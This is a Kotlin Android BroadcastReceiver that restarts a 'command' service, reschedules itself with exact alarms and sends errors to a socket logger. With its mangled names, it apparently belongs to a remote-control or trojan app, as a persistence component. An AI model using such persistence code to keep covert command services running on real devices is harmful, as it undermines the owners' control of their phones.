package com.xxx.zzz.receiverss

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.servicesp.CommandServicedas
import com.xxx.zzz.servicesp.CommandServicedas.Companion.registerExactAlarm
import com.xxx.zzz.socketsp.IOSocketyt

class MyReceiverda : BroadcastReceiver() {

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    override fun onReceive(context: Context, intent: Intent) {
        Log.d("appp", "Broadcast Receiver")

        SharedPreferencess.init(context.applicationContext)
        CommandServicedas.autoStart(context)
    }

    companion object {
        fun startCustomTimer(context: Context, millisec: Long) {
            runCatching {
                val intent = Intent(context, MyReceiverda::class.java).putExtra("aaa", "AAA")
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    8888,
                    intent,
                    0 or PendingIntent.FLAG_IMMUTABLE
                )
                context.registerExactAlarm(pendingIntent, millisec)
            }.onFailure {
                IOSocketyt.sendLogs("", "startCustomTimer ${it.localizedMessage}", "error")
            }
        }
    }
}
